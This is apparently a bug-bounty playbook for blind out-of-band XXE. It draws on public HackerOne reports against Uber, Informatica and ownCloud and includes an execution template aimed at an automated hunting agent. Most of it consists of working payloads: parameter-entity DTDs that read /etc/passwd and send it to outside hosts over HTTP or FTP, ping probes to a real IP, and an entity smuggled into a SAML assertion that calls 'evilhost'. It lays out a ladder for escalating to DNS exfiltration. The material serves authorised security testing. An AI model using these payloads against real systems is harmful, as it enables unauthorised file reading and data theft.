---
title: "Blind OOB XXE — parameter entities, the exfil ladder, and the SAML carrier"
type: playbook
category: blind-oob-parameter-entities
cwe: "CWE-611"
source_count: 22
full_bodies_available: 4
corpus: "h1.security.nathan.sx roster (44 rows), bodies via hackerone.com/reports/<id>.json"
list_accessed: "2026-10-27"
note: "Anchor body: XXE-154096 (Uber Movement, $500 JSON-verified). All claims trace to bodies read 2026-10-27."
---

# Blind OOB XXE — when nothing is reflected

## 1. Overview

When the parser resolves entities but never echoes them, proof moves to infrastructure the agent
owns: **the server makes an outbound request**. This corpus contains the full ladder — plain
OOB ping (Uber), OOB HTTP confirmation (ownCloud), and OOB *file-content exfiltration* through a
parameter-entity DTD over FTP (Informatica ondemand).

**Case-ID scheme: `XXE-<report id>`.**

## 2. The anchor case — XXE-154096 (Uber Movement, $500 JSON)

The carrier is a GET endpoint the reporter **converted to POST by hand**:

> Grab the GET request … Send request to repeater & change it to POST … Now Add content type:
> `Content-type: application/xml`

Then two stages, verbatim from the body:

**Stage 1 — the ping probe** (cheapest possible: no DTD, no staging):

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM "http://122.180.248.81/"> ]>
<GeneralSearch>&dtgmlf6ent;</GeneralSearch>
```

> An HTTP request was initiated for the domain http://122.180.248.81/ which indicates that this
> script is vulnerable to XXE injection.

> HTTP request details: IP address: 8.36.86.67 — User agent: **Java/1.8.0_60**

The `User-Agent` line is the attribution gem: the request came from the target's Java runtime, not
a browser — the same server-attribution logic the SQLi vault's OOB playbook canonized
(`Microsoft-WebDAV-MiniRedir` there, `Java/1.8.0_60` here).

**Stage 2 — the exfil attempt** (parameter-entity two-stage DTD):

```xml
<!DOCTYPE roottag [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://122.180.248.81/payload.dtd">
%dtd;]>
<GeneralSearch>&send;</GeneralSearch>
```

with the hosted DTD:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://xxe.me/content?%file;'>">
%all;
```

And the honest kill-sentence that set the payout:

> NOTE : If you view your web server logs you will find a 404 error.

followed by:

> As it was Blind XXE Test I was Successful in Ping Test for XXE. But unable to retrieve any
> sensitive information.

**This is the corpus's most important honesty anchor**: blind OOB *without exfil* paid $500 —
labeled as a third-party vendor's product bug — and the team summary records why:

> As it didn't affect Uber's internal infrastructure it had a significantly lower impact and was
> rewarded accordingly.

## 3. The exfil ladder, completed — XXE-105753 (Informatica ondemand)

Same parameter-entity DTD pattern, but the researcher **exfiltrated real content** — and used
`ftp://` as the transport (Java parsers speak FTP; many egress filters block HTTP but not the
JAXP default handler set):

```xml
<!DOCTYPE root [
<!ENTITY % b PUBLIC "lol" "file:///etc/passwd">
<!ENTITY % asd PUBLIC "lol" "http://mysite/xx.html">
%asd;
%rrr;]>
```

hosted DTD:

```xml
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://mysite/%b;'>">%c;
```

> Then i got file /etc/passwd (xxe_app.png)

Note `&#37;` (percent-entity) inside the DTD string — the XML-legal way to nest `%` when building
parameter-entity definitions from within an external DTD. That single escape is the difference
between a working exfil DTD and a parse error.

The carrier here is a **login endpoint** (`POST /ma/api/v2/user/login`) that takes XML — auth
flows eating XML are prime blind-OOE carriers because their error paths are usually silent.

## 4. The OOB-confirmation-only case — XXE-105980 (ownCloud vpn)

`POST /user/login` on the VPN portal, `Content-type: application/xml`, parameter entity:

```xml
<!DOCTYPE a [
<!ENTITY % select SYSTEM "http://wallarm.tools/ok">
%select;
]>
```

and the proof is a **server log line from the agent's own host**:

> From access.log on this server:
> `2a01:4f8:192:50d6::2 - - [18/Dec/2015:21:11:47 +0300] "GET /ok HTTP/1.0" 200 227 "-" "-"`

Own your listener: the timestamp, source IPv6, and request path all live in a log the agent can
produce in the report. (Body claims *"read arbitrary files and make HTTP requests"*; only the HTTP
half is evidenced in-body — record the delta.)

## 5. The SAML carrier — XXE-106865 (Informatica rev-app)

SAML responses are base64 XML posted to the SP — the entity rides **inside the decoded assertion
prologue**:

> Where SAMLResponse XML in base64 with XXE payload:
> `<!DOCTYPE foo [ <!ENTITY % asd SYSTEM "http://evilhost"> %asd;]>`

Decoded-then-parsed is the sequence to test: the ACS endpoint must decode base64 *before* XML
parsing, so your DOCTYPE survives as plain text into the parser. If the IdP signs and the SP
validates the signature *before* parsing entities, the payload dies — that ordering is the whole
game (see `hunt-saml` for the signature-wrapping lane; this vault owns only the entity lane).

## 6. Agent execution template

1. **Listener up first** — self-hosted or interactsh; zseano's warning verbatim:
   `.burpcollaborator.net` is usually blocked.
2. **Ping probe**: general entity → `http://<oast>/x` in a rendered-safe node. Distinct path per
   payload instance for attribution.
3. **Attribution check**: UA in the callback should name the server runtime (Java/1.8.0_60 here;
   libxml2, .NET, PHP streams have their own fingerprints). Browser-UA callback = wrong lane.
4. **Escalate, don't stop**: parameter-entity DTD (§2 stage-2 shape) → `ftp://` variant on Java
   (§3) → DNS-carried exfil when HTTP egress dies. Each rung needs a fresh callback path.
5. **When exfil fails, price the finding honestly**: ping-only was worth $500 here *because* the
   impact narrative said so. Write the impact paragraph the same way: what can the parser reach,
   what was actually proven.
6. **Convert GET→POST + Content-Type swap** is a legitimate carrier probe (the anchor did exactly
   that) — document it as steps, not as "found an XML endpoint".

## 7. Validation gates

1. **Callback from the target's egress** with server-runtime UA; timestamp + source IP in the log
   line, exactly as §3/§4's bodies record them.
2. **Two-stage discipline on exfil claims**: stage-1 file load (`%file;`) and stage-2 transmit
   (`%send;`) must both be visible in the DTD chain you publish; a single-entity "exfil" is a ping.
3. **404 ≠ failure to prove**: the anchor's own 404-in-log is *the* honest boundary — a callback
   without content is reported as a callback, priced as one.
4. **No production secrets through the channel** — mask/`truncated by researcher` like the era's
   reports did.
5. **SAML lane**: decoded-prologue placement shown in the report (paste the decoded assertion),
   signature-order question answered or explicitly left open.

## 8. Adjacency — the modern confirmation stack

Post-roster citations (blogs-index §2/§4, not register rows): honoki's *blind XXE → root-level
file read* (error-based local-DTD trick — the lane when OOB egress is fully firewalled), mohemiv's
*local DTD files* catalog, mahmoudsec's *php wrappers + internal network*, Coalfire's WebCTRL
CVE-2018-8819, PrizmDoc CVE-2018-15805. The anchor case here is the ping; the local-DTD
error-based lane in `File-Upload-and-Format-Vectors.md` §6 is its no-egress successor.

**Cross-references**: reflected lane in `In-Band-File-Read.md`; feed/SVG/OOXML carriers in
`File-Upload-and-Format-Vectors.md`; SSRF pricing in `../SSRF/`; the attribution canon in the SQLi
vault's `../SQLi/Out-of-Band-Callback.md`.
